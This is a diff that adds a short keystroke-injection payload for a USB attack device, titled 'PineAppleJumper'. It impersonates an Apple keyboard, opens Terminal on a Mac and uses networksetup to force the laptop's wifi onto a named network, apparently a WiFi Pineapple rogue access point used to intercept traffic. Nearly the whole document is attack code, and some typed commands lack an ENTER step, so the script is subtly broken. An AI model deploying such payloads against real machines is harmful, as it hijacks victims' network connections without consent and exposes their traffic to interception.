@@ -1,0 +1,23 @@
+# Title: 	PineAppleJumper
+# Author: 	PuggosTheDuck
+# Version:	1.0
+#
+# Manipulates the Mac laptop to change wifi to the WifiPinapple
+#
+# Amber..............Executing payload
+# Green..............Finished
+#
+
+ATTACKMODE HID VID_0X05AC PID_0X021E
+DELAY 1000
+Q GUI SPACE
+DELAY 1000
+Q STRING terminal
+Q ENTER
+DELAY 1000
+Q STRING cd /
+DELAY 1000
+Q STRING /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
+DELAY 1000
+Q STRING networksetup -setairportnetwork en0 Fios-R3JT1-5G
+Q ENTER
